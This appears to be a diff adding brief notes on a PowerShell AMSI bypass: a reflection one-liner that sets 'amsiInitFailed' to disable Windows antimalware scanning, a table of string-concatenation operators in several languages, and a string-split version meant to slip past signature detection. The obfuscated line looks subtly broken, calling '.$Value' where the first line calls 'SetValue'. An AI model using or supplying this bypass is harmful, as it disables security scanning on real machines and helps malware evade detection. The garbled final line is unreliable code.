@@ -1,0 +1,13 @@
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+To obfuscate this
+
+
+Language               Concatenation Operator
+Python                          “+”
+PowerShell       “+”, ”,”, ”$”, or no operator at all
+C#                 “+”, “String.Join”, “String.Concat”
+C                           “strcat”
+C++                       “+”, “append”
+
+
+[Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').$Value($null,$true)
